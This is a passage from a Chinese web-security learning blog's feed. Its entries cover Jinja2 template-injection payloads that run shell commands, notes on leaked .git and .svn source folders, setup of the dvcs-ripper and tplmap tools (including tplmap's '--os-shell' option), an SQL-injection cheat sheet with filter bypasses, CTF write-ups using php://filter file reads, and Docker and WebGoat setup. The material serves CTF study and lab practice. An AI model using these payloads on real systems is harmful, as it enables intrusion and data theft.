class="hljs-identifier">__globals__</span>&#125;</span></span>&#125;<br>?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<span class="hljs-literal">[<span class="hljs-number">166</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>&#125;</span></span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6tdi7SxupBJh3qW.png" alt="image-20201112184228318"></p><h3 id="查看166号子类的模板中的函数"><a href="#查看166号子类的模板中的函数" class="headerlink" title="查看166号子类的模板中的函数"></a>查看166号子类的模板中的函数</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">166</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;&#125;<br>?<span class="hljs-built_in">name</span>=&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">166</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/ajHSTDWmh1w6ZgI.png" alt="image-20201112185201824"></p><h3 id="利用函数构造payload"><a href="#利用函数构造payload" class="headerlink" title="利用函数构造payload"></a>利用函数构造payload</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">166</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/o5tah4QlVHFZbxI.png" alt="image-20201112185822710"></p><blockquote><p>理解不一定对</p></blockquote><h3 id="常见的payload"><a href="#常见的payload" class="headerlink" title="常见的payload"></a>常见的payload</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[166].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;<br>?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">166</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__import__&#x27;</span>](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>后面还需要熟练掌握各种绕过方法</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码泄露</title>
    <link href="/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="hg-源码泄露"><a href="#hg-源码泄露" class="headerlink" title=".hg 源码泄露"></a>.hg 源码泄露</h3><p>漏洞成因：hg init的时候会生成.hg</p><a id="more"></a><h3 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h3><p>漏洞成因：在运行git init 初始化代码库的时候，会生成一个.git隐藏文件</p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p>泄露成因：在发布代码时未删除文件夹中隐藏.DS_Store，被发现后，获取了敏感的文件名等信息</p><p>路径检查工具：dsstoreexp</p><p><code>python ds_store_exp.py http://www.am0s.com/.DS_Store</code></p><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>备份文件的后缀：.rar .zip .7z .tar.gz .bak  .swp .txt .html</p><h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>/WEB-INF/web.xml</td><td>web应用配置文件，描述了servlet和其他的应用组件配置及命名规则</td></tr><tr><td>/WEB-INF/classes/</td><td>站点所有用的 class 文件，包括 servlet class 和非servlet class</td></tr><tr><td>/WEB-INF/lib/</td><td>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件</td></tr><tr><td>/WEB-INF/src/</td><td>源码目录，按照包名结构放置各个java文件</td></tr><tr><td>/WEB-INF/database.properties</td><td>数据库配置文件</td></tr></tbody></table><h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ripper,tplmap,GitHack安装</title>
    <link href="/2020/10/31/ripper-tplmap-GitHack%E5%AE%89%E8%A3%85/"/>
    <url>/2020/10/31/ripper-tplmap-GitHack%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h3 id="ripper"><a href="#ripper" class="headerlink" title="ripper"></a>ripper</h3><ol><li><p>ripper是一款源码泄露利用工具；</p></li><li><p>使用范围：.git  .svn .hg 泄露；</p></li><li><p>安装方法使用docker安装；</p><blockquote><p>使用docker安装是因为此方式方便快捷</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">安装：sudo docker pull k0st/alpine-dvcs-ripper<br>启动：sudo docker run -i -t --rm k0st/alpine-dvcs-ripper bash<br>使用（以.svn泄露为例）：rip-svn.pl -u URL<span class="hljs-regexp">/.svn/</span><br>退出：<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><a id="more"></a></li></ol><h3 id="GitHacker"><a href="#GitHacker" class="headerlink" title="GitHacker"></a>GitHacker</h3><ol><li><p>安装</p><p><img src="https://i.loli.net/2020/10/31/UtV4IkDYWTEadsB.png" alt="image-20201031181944238"></p></li><li><p>使用</p><p><img src="https://i.loli.net/2020/10/31/qdT21hlEioH9gQL.png" alt="image-20201031182129495"></p><p>进入目录，执行脚本</p></li></ol><h3 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h3><ol><li><p>Tplmap 是ssti模板注入检测攻击工具</p></li><li><p>python2环境</p></li><li><p>ubuntu 安装</p><p>git clone <a href="https://github.com/epinna/tplmap.git">https://github.com/epinna/tplmap.git</a></p></li><li><p>开始命令</p><p>cd tplmap<br>./tplmap.py -u ‘URL’ –os-shell</p></li><li><p>退出</p><p>ctl+c</p></li><li><p>错误解决</p><p><img src="https://i.loli.net/2020/10/31/AIvFwOM684Vdyho.png" alt="image-20201031210053259"></p><p>安装yaml即可</p><p>sudo apt-get install python-yaml</p><p><img src="https://i.loli.net/2020/10/31/Rtde3guMojDKq2I.png" alt="image-20201031210258274"></p><p>安装requests</p><p>pip install requests</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础</title>
    <link href="/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；<br>    按返回结果分类有： 报错注入 盲注入；</p><a id="more"></a><h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol><li><p>判断数字型注入与字符型注入<br>id=1         正确<br>id=1’        错误<br>id=1 and 1=1 正确<br>id=1 and 1=2 错误<br>则根据上述情况一般可以确定为数字型注入；<br>字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别；</p></li><li><p>注入的一般语句<br>使用 order by 确定字段数 并判断回显位置；<br>查库名 id= -1 union select schema_name from information_schema.schemata –+<br>查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+<br>查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名”  –+<br>查字段的值 id=-1 union select 字段名 from 表名 –+</p></li><li><p>盲注入</p><ol><li>盲注入分为：基于时间盲注入与基于布尔的盲注入；</li><li>相关函数：<ol><li>sleep() 延时返回</li><li>substr(string,n,m)从字符串的第n个位置开始截取m个字符</li><li>if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3;</li></ol></li><li>基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用；<ol><li>id=1 and length(database())&gt;n –+ 判断数据库的名字长度；</li><li>id=1 and substr(database(),1,1)&gt;’字符’ –+ 判断数据库名字；</li><li>id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=’字符’ –+ 判断表名；</li><li>id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=’表名’ limit 0,1), 1, 1 )=’字符’ –+ 判断字段；</li><li>id=1 and substr((select 字段 from 表名 limit 0,1))=’’ –+ 判断值；</li></ol></li></ol></li><li><p>延时注入：适用与页面回显不变时；</p><ol><li>id=1 and if((database()=’’),sleep(3),null)；其余类似只需要改变判断条件即可；</li></ol></li><li><p>报错注入（利用数据库的报错信息来获取我们需要的东西）</p></li><li><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>count()</td><td>统计select 返回的记录条数</td></tr><tr><td>concat()</td><td>字符串连接功能</td></tr><tr><td>floor()</td><td>向下取整</td></tr><tr><td>rand()</td><td>生成0~1 之间的随机浮点数</td></tr><tr><td>group    by</td><td>根据一个或多个列对结果进行排序</td></tr><tr><td>floor(rand(0)*2)</td><td>产生随机数0或1</td></tr><tr><td>updatexml()</td><td>mysql 5.1.5</td></tr><tr><td>extractvalue()</td><td>mysql 5.1.5</td></tr></tbody></table></li><li><p>函数利用</p><ol><li>id=1 and select count(*), concat( (…) , 0x7e , floor(rand(0)*2))x from information_schema.tables group by x –+；</li><li>id=1 and select 1 from (select counut(*), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+；</li><li>id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位；</li><li>id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位；</li></ol></li><li><p>格式化注入</p><ol><li>sprintf()将格式化字符串写入变量中；</li><li>sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成；</li><li>该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\，那么PHP会把\当作一个格式化字符的类型而吃掉,最后%\或%1$\被替换为空；</li><li>addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义；</li><li>输入 %1$’ 变成 %1$&#39; 单引号成功逃逸；</li></ol></li></ol><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol><li>双写绕过；oorr  ununionion seselectlect ……</li><li>大小写绕过</li><li>编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）；</li><li>内联注释绕过</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python的requests库应用</title>
    <link href="/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/"/>
    <url>/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="Python-requests库"><a href="#Python-requests库" class="headerlink" title="Python requests库"></a>Python requests库</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#发送get请求：</span><br>response = requests.get(url,params=   )<br><span class="hljs-comment">#发送Post请求：</span><br>response = requests.post(url,data=   )  <br><span class="hljs-comment">#获取正文内容：</span><br>print(response.text)<br><span class="hljs-comment">#获取响应状态码</span><br>print(response.status_code)<br><span class="hljs-comment">#定制请求头部</span><br>response = requests.post(url,headers=  ) <br><span class="hljs-comment">#修改cookies</span><br>response = requests.post(url , cookies= )<br><span class="hljs-comment">#设置请求超时的时间</span><br>response = requests.post(url, timeout= <span class="hljs-number">0.001</span>)<br></code></pre></td></tr></table></figure><h4 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP header中猜测的响应内容编码</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式（图片的还原）</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Curl分片下载</title>
    <link href="/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/"/>
    <url>/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="2020-年-天翼杯签到题"><a href="#2020-年-天翼杯签到题" class="headerlink" title="2020 年 天翼杯签到题"></a>2020 年 天翼杯签到题</h2><h4 id="题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag"><a href="#题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag" class="headerlink" title="题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag"></a>题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag</h4><a id="more"></a><h5 id="当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载"><a href="#当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载" class="headerlink" title="当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载"></a>当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载</h5><h3 id="curl分片下载前提"><a href="#curl分片下载前提" class="headerlink" title="curl分片下载前提"></a>curl分片下载前提</h3><p>服务器需要支持  HTTP Range Request，可以用curl查看请求头，例如：<br><code> curl -I http://mirrors.ustc.edu.cn/debian-cd/amd64/ios-cd/debian-mac-9.3.0-amd64-netinst.iso</code><br>若返回结果内包含：Accept-Ranges:bytes ，则说明这个服务器是支持 HTTP Range Request的；<br>若结果不包含，则可能不支持；<br>若结果包含Accept-Ranges:none 则表示不支持；</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><code> curl --range 0-5000000000 -o  part1 &lt;url&gt;</code> –range 指定下载的某一片段；此处指定的片段大小约为50G左右；</p><h3 id="合并拼接"><a href="#合并拼接" class="headerlink" title="合并拼接"></a>合并拼接</h3><p><code> cat part1 part2 &gt; outputfile</code> </p><blockquote><p>此处应该注意片段文件的顺序<br>拼接的方法有cat和dd，cat比较简单，容易使用；</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker搭建webgoat</title>
    <link href="/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/"/>
    <url>/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/</url>
    
    <content type="html"><![CDATA[<h3 id="虚拟机：Ubuntu18-服务器版"><a href="#虚拟机：Ubuntu18-服务器版" class="headerlink" title="虚拟机：Ubuntu18 服务器版"></a>虚拟机：Ubuntu18 服务器版</h3><a id="more"></a><h3 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h3><ol><li>在虚拟机上安装docker；</li><li><code>$ sudo docker search webgoat</code> 查找webgoat镜像；</li><li><code>$ sudo docker pull webgoat/webgoat-8.0</code> 拉取镜像；</li><li><code>$ sudo docker run -dt --name webgoat -p 8080:8080 --rm webgoat/webgoat-8.0</code> 开启镜像服务；</li><li>使用浏览器访问：ip:8080/WebGoat 即可；</li><li>自己创建账户登录，即可使用，全英文界面可能对和我一样的英语白痴来说不太友好；</li></ol><blockquote><p>网上看到一些其他的开启镜像的方法，我使用的时候一直卡着启动不了。</p></blockquote><h3 id="联合搭建webgoat与webwolf"><a href="#联合搭建webgoat与webwolf" class="headerlink" title="联合搭建webgoat与webwolf"></a>联合搭建webgoat与webwolf</h3><ol><li><p>使用docker拉取镜像：<code>sudo docker pull webgoat/goatandwolf</code></p></li><li><p>启动镜像：<code>sudo docker run -d -p 8081:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf </code></p><blockquote><p>可能会出现浏览器兼容问题</p></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PicGo+github图床</title>
    <link href="/2020/10/12/PicGo-github%E5%9B%BE%E5%BA%8A/"/>
    <url>/2020/10/12/PicGo-github%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><h4 id="安装PicGo软件；"><a href="#安装PicGo软件；" class="headerlink" title="安装PicGo软件；"></a>安装<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo</a>软件；</h4><a id="more"></a><h2 id="创建GitHub图床"><a href="#创建GitHub图床" class="headerlink" title="创建GitHub图床"></a>创建GitHub图床</h2><h4 id="创建GitHub账户并且建立一个厂库，用于存储自己的图片；"><a href="#创建GitHub账户并且建立一个厂库，用于存储自己的图片；" class="headerlink" title="创建GitHub账户并且建立一个厂库，用于存储自己的图片；"></a>创建GitHub账户并且建立一个厂库，用于存储自己的图片；</h4><h2 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h2><ol><li><p><img src="https://cdn.jsdelivr.net/gh/lcdm123/PicGo/img/20200815130926.png" alt="选择图床"></p></li><li></li><li><p><img src="https://cdn.jsdelivr.net/gh/lcdm123/PicGo/img/20200815131323.png" alt="配置详细信息"></p></li><li><p>上图的Token需要在自己的github账户上获取</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/lcdm123/PicGo/img/image-20200815131649820.png" alt="image-20200815131649820"></p><p><img src="https://cdn.jsdelivr.net/gh/lcdm123/PicGo/img/image-20200815131812509.png" alt="image-20200815131812509"></p><p><img src="https://cdn.jsdelivr.net/gh/lcdm123/PicGo/img/image-20200815132058217.png" alt="image-20200815132058217"></p></li><li><p>然后选择最下方的创建即可；</p><blockquote><p>配置成功后，之后偶尔上传图片时可能会出现错误，可以重启PicGo即可（别问为什么，玄学）</p></blockquote></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CUTMCTF</title>
    <link href="/2020/10/12/CUTMCTF/"/>
    <url>/2020/10/12/CUTMCTF/</url>
    
    <content type="html"><![CDATA[<h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><a id="more"></a><p>步骤</p><p><img src="https://i.loli.net/2020/09/25/Kq6CBSTMkHXfs3o.png" alt="image-20200925165820245"></p><p>打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可；</p><p><img src="https://i.loli.net/2020/09/25/QqloIgrzCchRbd3.png" alt="image-20200925170036066"></p><ol start="3"><li>传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite</li></ol><p><img src="https://i.loli.net/2020/09/25/lskFRmVnJd5C2zj.png" alt="image-20200925171007578"></p><p>在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码；</p><p><img src="https://i.loli.net/2020/09/25/6VsZgIjQrnFXPvo.png" alt="image-20200925171241179"></p><p>明显是使用PHP伪协议查看源文件即可获得flag</p><p><img src="https://i.loli.net/2020/09/25/JcMNArDHa834Rpq.png" alt="image-20200925171533778"></p><p>base64解码即可</p><p><img src="https://i.loli.net/2020/09/25/FIXL79H1Gn5SoVf.png" alt="image-20200925171628695"></p><h3 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h3><p>使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格；</p><p><img src="https://i.loli.net/2020/09/25/lwERh63IeMtduHF.png" alt="image-20200925182450014"></p><p>并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询</p><p><img src="https://i.loli.net/2020/09/24/ECaKH2o9sVJjhOP.png" alt="image-20200924001249509"></p><p>发现flag，成功</p><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>发现图片，并且下载图片，按文本格式打开，后发现php代码</p><p><img src="https://i.loli.net/2020/09/25/aRE3vTsg2JMOPUF.png" alt="图片代码"></p><p>进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents($str1)是指需要str1以文件的形式写入值，is_numeric($str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag；</p><p><img src="https://i.loli.net/2020/09/23/aVLGgDedcMPAiTk.png" alt="image-20200923234150197"></p><blockquote><p>使用十六进制绕过sleep()函数；</p><p>使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容</p><p>关于sha1()函数的绕过，网上查找到文章<a href="https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/">https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/</a></p></blockquote><h3 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h3><p>按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号；</p><p><img src="https://i.loli.net/2020/09/25/EpH73LIr4gliABw.png" alt="图片"></p><p>绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用；</p><p>由于flag的开头为C 所以就尝试猜测flag在password中的位置<img src="https://i.loli.net/2020/09/25/AvFOQm5wRq7PjfY.png" alt="image-20200925190307198"></p><p>结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为        CUMTCTF{}，大括号内全为小写；</p><p><img src="https://i.loli.net/2020/09/25/OxhNUdj5yHP9Mki.png" alt="image-20200925185852672"></p><h3 id="简单文件包含"><a href="#简单文件包含" class="headerlink" title="简单文件包含"></a>简单文件包含</h3><p>页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应  然后尝试使用client-ip:127.0.0.1  成功；</p><p><img src="https://i.loli.net/2020/09/25/1clwSiMaeBCGAE3.png" alt="image-20200925191129537"></p><p>发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/25/mYhFJAaHixUqONd.png" alt="image-20200925200726904"></p><p>base64解码即可</p><p><img src="https://i.loli.net/2020/09/25/W32tCOrTM5U9uRh.png" alt="image-20200925200827613"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu安装Docker</title>
    <link href="/2020/08/01/ubuntu%E5%AE%89%E8%A3%85Docker/"/>
    <url>/2020/08/01/ubuntu%E5%AE%89%E8%A3%85Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs y">sudo apt-get update<br>sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common<br> <br># step 2: 安装GPG证书<br>curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -<br> <br># Step 3: 写入软件源信息<br>sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot;<br> <br># Step 